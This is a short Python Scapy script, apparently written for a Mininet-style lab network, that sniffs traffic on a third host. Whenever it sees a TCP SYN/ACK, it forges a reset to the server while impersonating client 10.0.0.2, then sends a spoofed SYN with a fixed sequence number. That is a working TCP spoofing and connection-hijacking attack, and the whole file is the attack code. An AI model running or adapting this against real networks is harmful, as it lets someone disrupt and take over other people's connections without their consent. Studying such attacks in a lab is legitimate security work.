from scapy.all import *
import logging

logging.basicConfig(format='%(levelname)s: %(message)s', filename='scapy.log',level=logging.DEBUG)

FIN = 0x01
SYN = 0x02
RST = 0x04
PSH = 0x08
ACK = 0x10
URG = 0x20
ECE = 0x40
CWR = 0x80

def isNotOutgoing(pkt):
    return pkt[Ether].src != "00:00:00:00:00:03"


def pkt_callback(pkt):
    if pkt.haslayer(TCP):
        # print(pkt.show())
        # When we get the synack, send rst to server and new syn
        if pkt[TCP].flags & SYN and pkt[TCP].flags & ACK:
            logging.info("Intercepted a SYN/ACK")
            rst_pkt = pkt
            del rst_pkt[IP].chksum
            del rst_pkt[TCP].chksum
            del rst_pkt[TCP].ack
            rst_pkt[TCP].flags = RST
            rst_pkt[IP].src = "10.0.0.2"
            rst_pkt[IP].dst = "10.0.0.1"
            rst_pkt[Ether].src = "00:00:00:00:00:02"
            rst_pkt[Ether].dst = "00:00:00:00:00:01"
            sendp(rst_pkt, iface = 'h3-eth0')
            # print(rst_pkt.show())

            # create the new packet with changed sequence number
            new_pkt = rst_pkt
            new_pkt[TCP].flags = SYN
            new_pkt[TCP].seq = 1414
            sendp(new_pkt, iface = 'h3-eth0')
            # print(new_pkt.show())
    # print(pkt.show())
    # logging.info(pkt.show())

sniff(iface="h3-eth0", prn=pkt_callback, store=0, lfilter=isNotOutgoing)
